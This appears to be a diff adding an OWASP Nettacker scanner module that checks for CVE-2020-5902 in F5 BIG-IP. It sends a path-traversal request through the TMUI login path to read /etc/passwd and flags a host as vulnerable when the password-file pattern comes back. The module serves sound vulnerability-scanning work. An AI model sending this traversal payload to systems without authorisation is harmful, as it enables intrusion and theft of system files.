@@ -1,0 +1,46 @@
+info:
+  name: f5_cve_2020_5902_vuln
+  author: OWASP Nettacker Team
+  severity: 9
+  description:
+  reference:
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - critical_severity
+    - f5_cve_2020_5902
+
+payloads:
+  - library: http
+    verify: false
+    timeout: 10
+    cert: ""
+    stream: false
+    proxies: ""
+    steps:
+      - method: get
+        headers:
+          User-Agent: "{user_agent}"
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: "root:.*:0:0:"
+              reverse: false
